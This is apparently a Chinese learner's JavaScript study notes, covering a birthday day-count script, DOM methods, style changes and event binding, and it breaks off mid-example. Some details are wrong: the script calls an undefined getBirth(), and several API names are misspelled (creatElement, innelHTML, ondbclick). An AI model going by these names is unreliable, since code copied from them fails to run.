&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;head&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &amp;lt;title&amp;gt;生日计算器&amp;lt;&#x2F;title&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F;获取用户生日信息&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F;通过parseInt和prompt获取年、月、日，并转化成整数&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            var year=parseInt(prompt(&amp;quot;请输入您的出生年份&amp;quot;));&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            var month=parseInt(prompt(&amp;quot;请输入您的出生月份&amp;quot;));&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            var day=parseInt(prompt(&amp;quot;请输入您的出生日期&amp;quot;));&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &#x2F;&#x2F;打印最终生日格式，在这里需要调用finalBirth函数并传入这里的year、month、day三个参数&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            document.write(&amp;quot;您的生日是&amp;quot;+year+&amp;quot;年&amp;quot;+finalBirth(year,month,day)+&amp;quot;天&amp;quot;);&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F;日期计算器&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        function finalBirth(year,month,day)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        {&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &#x2F;&#x2F;定义变量n为天数&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            var n;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &#x2F;&#x2F;判断是否闰年,能被4整除不被100整除，或者被400整除的&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            if((year%4==0&amp;amp;&amp;amp;year%100!=0)||year%400==0)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            {&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                if(month==1)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                    n=day;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                else if(month==2)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                    n=parseInt(31)+parseInt(day);&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                else if(month==3)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                    n=parseInt(60)+parseInt(day);&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                else if(month==4)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                    n=parseInt(91)+parseInt(day);&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                else if(month==5)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                    n=parseInt(121)+parseInt(day);&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                else if(month==6)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                    n=parseInt(152)+parseInt(day);&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                else if(month==7)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                    n=parseInt(182)+parseInt(day);&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                else if(month==8)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                    n=parseInt(213)+parseInt(day);&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                else if(month==9)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                    n=parseInt(244)+parseInt(day);&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                else if(month==10)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                    n=parseInt(274)+parseInt(day);&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                else if(month==11)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                    n=parseInt(305)+parseInt(day);&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                else if(month==12)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                    n=parseInt(335)+parseInt(day);&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            else&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            {&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                if(month==1)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                    n=day;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                else if(month==2)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                    n=parseInt(31)+parseInt(day);&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                else if(month==3)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                    n=parseInt(59)+parseInt(day);&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                else if(month==4)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                    n=parseInt(90)+parseInt(day);&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                else if(month==5)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                    n=parseInt(120)+parseInt(day);&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                else if(month==6)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                    n=parseInt(151)+parseInt(day);&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                else if(month==7)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                    n=parseInt(181)+parseInt(day);&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                else if(month==8)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                    n=parseInt(212)+parseInt(day);&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                else if(month==9)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                    n=parseInt(243)+parseInt(day);&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                else if(month==10)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                    n=parseInt(273)+parseInt(day);&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                else if(month==11)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                    n=parseInt(304)+parseInt(day);&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                else if(month==12)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                    n=parseInt(334)+parseInt(day);&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                &#x2F;&#x2F;判断之后，返回最终天数&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                return n;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F;执行函数&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            getBirth();&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &amp;lt;&#x2F;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;&#x2F;head&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;body&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;&#x2F;body&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;html&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;JavaScript DOM&lt;&#x2F;p&gt;
&lt;p&gt;DOM(document object model)&lt;&#x2F;p&gt;
&lt;p&gt;文档对象类型是浏览器处理网页的一种方法，包括读、增、删、改等操作&lt;&#x2F;p&gt;
&lt;p&gt;浏览器进行网页加载时，会建立DOM树，并将网页元素放在不同的节点中，不管什么网页，都可以基于DOM来处理&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;JavaScript&#x2F;image-20200812183609730.png&quot; alt=&quot;image-20200812183609730&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;一切皆节点&lt;&#x2F;p&gt;
&lt;p&gt;整个文档是一个文档节点&lt;&#x2F;p&gt;
&lt;p&gt;每一个html元素是元素节点&lt;&#x2F;p&gt;
&lt;p&gt;html元素内的文本是文本节点&lt;&#x2F;p&gt;
&lt;p&gt;html元素的属性是属性节点&lt;&#x2F;p&gt;
&lt;p&gt;注释是注释节点&lt;&#x2F;p&gt;
&lt;p&gt;各个节点之间存在父、子、同胞关系，所以就形成了DOM树&lt;&#x2F;p&gt;
&lt;p&gt;DOM的属性和方法&lt;&#x2F;p&gt;
&lt;p&gt;innelHTML节点的文本值&lt;&#x2F;p&gt;
&lt;p&gt;attribute 节点的属性节点&lt;&#x2F;p&gt;
&lt;p&gt;parentNode 父节点&lt;&#x2F;p&gt;
&lt;p&gt;childNode 子节点&lt;&#x2F;p&gt;
&lt;p&gt;DOM方法&lt;&#x2F;p&gt;
&lt;p&gt;getElementById() 返回带有指定ID的元素&lt;&#x2F;p&gt;
&lt;p&gt;getElementsByTagName()返回带有指定标签名称的所有元素的数组&lt;&#x2F;p&gt;
&lt;p&gt;getElementsByClassName() 包含带有指定类名的所有元素的节点列表&lt;&#x2F;p&gt;
&lt;p&gt;appendchild() 把新的子节点添加到指定节点&lt;&#x2F;p&gt;
&lt;p&gt;removechild() &lt;&#x2F;p&gt;
&lt;p&gt;replacechild()&lt;&#x2F;p&gt;
&lt;p&gt;insertbefore()&lt;&#x2F;p&gt;
&lt;p&gt;creatElement() 创建元素节点&lt;&#x2F;p&gt;
&lt;p&gt;creatTextNode() 创建文本节点&lt;&#x2F;p&gt;
&lt;p&gt;createattribute() 创建属性节点&lt;&#x2F;p&gt;
&lt;p&gt;getattribute() 返回指定的属性值&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&amp;lt;body&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;h1 id=&amp;#39;dom&amp;#39;&amp;gt;hello world&amp;lt;&#x2F;h1&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;h1 class=&amp;quot;haha&amp;quot;&amp;gt;hi world&amp;lt;&#x2F;h1&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;h1 class=&amp;quot;haha&amp;quot;&amp;gt;test&amp;lt;&#x2F;h1&amp;gt; &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var a=document.getElementById(&amp;#39;dom&amp;#39;); &#x2F;&#x2F;获取的是元素&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var b=document.getElementsByClassName(&amp;#39;haha&amp;#39;); &#x2F;&#x2F;把获取到的元素放入一个列表，通过列表遍历来访问&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var c=document.getElementsByTagName(&amp;#39;h1&amp;#39;) &#x2F;&#x2F;把获取到的元素放入一个数组，通过数组遍历来访问&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        document.write(a.innerHTML+&amp;#39;&amp;lt;br&amp;gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        document.write(b[0].innerHTML+&amp;#39;&amp;lt;br&amp;gt;&amp;#39;)  &#x2F;&#x2F;列表遍历&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        document.write(c[2].innerHTML+&amp;#39;&amp;lt;br&amp;gt;&amp;#39;) &#x2F;&#x2F;数组遍历&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;&#x2F;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;body&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;div id=&amp;#39;div1&amp;#39;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &amp;lt;p id=&amp;quot;p1&amp;quot;&amp;gt;this is test1&amp;lt;&#x2F;p&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &amp;lt;p id=&amp;quot;p2&amp;quot;&amp;gt;this is test2&amp;lt;&#x2F;p&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;&#x2F;div&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var a=document.createElement(&amp;#39;p&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var b=document.createTextNode(&amp;#39;this is test3&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        a.appendChild(b)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var c=document.getElementById(&amp;#39;div1&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        c.appendChild(a)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;&#x2F;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;body&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;div id=&amp;#39;div1&amp;#39;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &amp;lt;p id=&amp;quot;p1&amp;quot; onclick=&amp;quot;document.getElementById(&amp;#39;p1&amp;#39;).style.color=&amp;#39;blue&amp;#39;&amp;quot;&amp;gt;this is test1&amp;lt;&#x2F;p&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &amp;lt;p id=&amp;quot;p2&amp;quot;&amp;gt;this is test2&amp;lt;&#x2F;p&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;&#x2F;div&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;a id=&amp;quot;pinke&amp;quot; href=&amp;quot;https:&#x2F;&#x2F;www.pinginglab.net&amp;quot; target=&amp;quot;_blank&amp;quot;&amp;gt;拼客学院&amp;lt;&#x2F;a&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F;创建并添加新的节点&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var a=document.createElement(&amp;#39;p&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var b=document.createTextNode(&amp;#39;this is test3&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        a.appendChild(b)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var c=document.getElementById(&amp;#39;div1&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        c.appendChild(a)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F;改变HTML样式&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        document.getElementById(&amp;#39;p1&amp;#39;).style.color=&amp;#39;red&amp;#39;;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        document.getElementById(&amp;#39;p2&amp;#39;).style.fontSize=&amp;#39;20px&amp;#39;;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F;修改HTML属性&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var d=document.getElementById(&amp;#39;pinke&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        d.href=&amp;quot;https:&#x2F;&#x2F;www.baidu.com&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        var e=document.getElementsByTagName(&amp;#39;p&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        e[2].style.color=&amp;#39;blue&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;&#x2F;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;body&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;DOM事件&lt;&#x2F;p&gt;
&lt;p&gt;事件就是文档或者浏览器窗口中发生的一些特定的交互瞬间&lt;&#x2F;p&gt;
&lt;p&gt;下面这些情况会触发事件：&lt;&#x2F;p&gt;
&lt;p&gt;当用户点击鼠标时&lt;&#x2F;p&gt;
&lt;p&gt;当网页已加载时&lt;&#x2F;p&gt;
&lt;p&gt;当图片已加载时&lt;&#x2F;p&gt;
&lt;p&gt;当鼠标移动到元素上时&lt;&#x2F;p&gt;
&lt;p&gt;当输入字段被改变时&lt;&#x2F;p&gt;
&lt;p&gt;当HTML表单被提交时&lt;&#x2F;p&gt;
&lt;p&gt;当用户触发按键时&lt;&#x2F;p&gt;
&lt;p&gt;事件可以分为鼠标事件、键盘事件、表单事件、拖动事件、打印时间、剪切板事件、多媒体事件、动画事件等&lt;&#x2F;p&gt;
&lt;p&gt;鼠标事件的方法属性&lt;&#x2F;p&gt;
&lt;p&gt;onclick&lt;&#x2F;p&gt;
&lt;p&gt;ondbclick 双击&lt;&#x2F;p&gt;
&lt;p&gt;onmousedown 鼠标按钮按下&lt;&#x2F;p&gt;
&lt;p&gt;onmouseenter鼠标指针移动到元素上&lt;&#x2F;p&gt;
&lt;p&gt;onmouseleave&lt;&#x2F;p&gt;
&lt;p&gt;onmousemove&lt;&#x2F;p&gt;
&lt;p&gt;onmouseup&lt;&#x2F;p&gt;
&lt;p&gt;键盘事件方法属性&lt;&#x2F;p&gt;
&lt;p&gt;onkeydown&lt;&#x2F;p&gt;
&lt;p&gt;onkeyup&lt;&#x2F;p&gt;
&lt;p&gt;onkeypress 按下并松开&lt;&#x2F;p&gt;
&lt;p&gt;表单事件方法属性&lt;&#x2F;p&gt;
&lt;p&gt;onblur失去焦点&lt;&#x2F;p&gt;
&lt;p&gt;onchange表单元素内容被改变时&lt;&#x2F;p&gt;
&lt;p&gt;onfocus获得焦点&lt;&#x2F;p&gt;
&lt;p&gt;oninput获取用户输入时&lt;&#x2F;p&gt;
&lt;p&gt;onselect用户选取文本时&lt;&#x2F;p&gt;
&lt;p&gt;onsubmit表单提交时&lt;&#x2F;p&gt;
&lt;p&gt;剪切板事件方法属性&lt;&#x2F;p&gt;
&lt;p&gt;oncopy&lt;&#x2F;p&gt;
&lt;p&gt;oncut&lt;&#x2F;p&gt;
&lt;p&gt;onpaste&lt;&#x2F;p&gt;
&lt;p&gt;拖动事件方法属性&lt;&#x2F;p&gt;
&lt;p&gt;ondrag 元素正在被拖动时&lt;&#x2F;p&gt;
&lt;p&gt;ondragend&lt;&#x2F;p&gt;
&lt;p&gt;ondragenter&lt;&#x2F;p&gt;
&lt;p&gt;ondragleave&lt;&#x2F;p&gt;
&lt;p&gt;打印事件方法属性&lt;&#x2F;p&gt;
&lt;p&gt;onafterprint 打印完成后&lt;&#x2F;p&gt;
&lt;p&gt;onbeforeprint 即将开始打印时&lt;&#x2F;p&gt;
&lt;p&gt;多媒体事件方法属性&lt;&#x2F;p&gt;
&lt;p&gt;oncanplay  用户可以开始播放时&lt;&#x2F;p&gt;
&lt;p&gt;onabort  多媒体终止加载时&lt;&#x2F;p&gt;
&lt;p&gt;onplay&lt;&#x2F;p&gt;
&lt;p&gt;onerror&lt;&#x2F;p&gt;
&lt;p&gt;框架&#x2F;对象事件方法属性&lt;&#x2F;p&gt;
&lt;p&gt;onabort 加载被中断&lt;&#x2F;p&gt;
&lt;p&gt;onerror加载发生错误时&lt;&#x2F;p&gt;
&lt;p&gt;onload 完成加载时&lt;&#x2F;p&gt;
&lt;p&gt;onscroll滚动时&lt;&#x2F;p&gt;
&lt;p&gt;onresize窗口被调整大小时&lt;&#x2F;p&gt;
&lt;p&gt;事件绑定&lt;&#x2F;p&gt;
&lt;p&gt;直接将HTML的元素绑定DOM事件&lt;&#x2F;p&gt;
&lt;p&gt;语法：&lt;&#x2F;p&gt;
&lt;p&gt;&amp;lt;tag 事件=“执行脚本”&amp;gt;&lt;&#x2F;tag&gt;&lt;&#x2F;p&gt;
&lt;p&gt;执行脚本也可以是一个函数&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&amp;lt;body&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;div class=&amp;quot;btn&amp;quot; onmouseover=&amp;quot;mouseover(this,&amp;#39;yellow&amp;#39;)&amp;quot; onmouseout=&amp;quot;mouseout(this,&amp;#39;blue&amp;#39;)&amp;quot;&amp;gt;开始&amp;lt;&#x2F;div&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;div class=&amp;quot;btn&amp;quot; onmouseover=&amp;quot;mouseover(this,&amp;#39;green&amp;#39;)&amp;quot; onmouseout=&amp;quot;mouseout(this,&amp;#39;gray&amp;#39;)&amp;quot;&amp;gt;结束&amp;lt;&#x2F;div&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        function mouseover(btn,bgcolor){&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            btn.style.background=bgcolor;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        function mouseout(btn,bgcolor){&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            btn.style.background=bgcolor;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        }&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;&#x2F;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;body&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;DOM 0级事件绑定&lt;&#x2F;p&gt;
&lt;p&gt;DOM 0级事件和HTML事件的区别在于0级事件绑定需要先通过DOM方法（比如说getElementById()）获取DOM的对象（HTML元素），然后在DOM对象上面绑定事件。&lt;&#x2F;p&gt;
&lt;p&gt;HTML事件的缺点就是会导致代码非常冗余。0级事件更加灵活，并且代码非常简洁。使用0级事件也可以使HTML代码与JS代码分离。&lt;&#x2F;p&gt;
&lt;p&gt;语法：&lt;&#x2F;p&gt;
&lt;p&gt;element事件=执行脚本&lt;&#x2F;p&gt;
&lt;p&gt;执行脚本可以是函数，也可以是函数的调用&lt;&#x2F;p&gt;
&lt;p&gt;如果要调用函数是函数生效，函数名称后面必须加括号&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&amp;lt;body&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;div class=&amp;quot;btn&amp;quot;&amp;gt;开始&amp;lt;&#x2F;div&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;div class=&amp;quot;btn&amp;quot;&amp;gt;结束&amp;lt;&#x2F;div&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;script&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
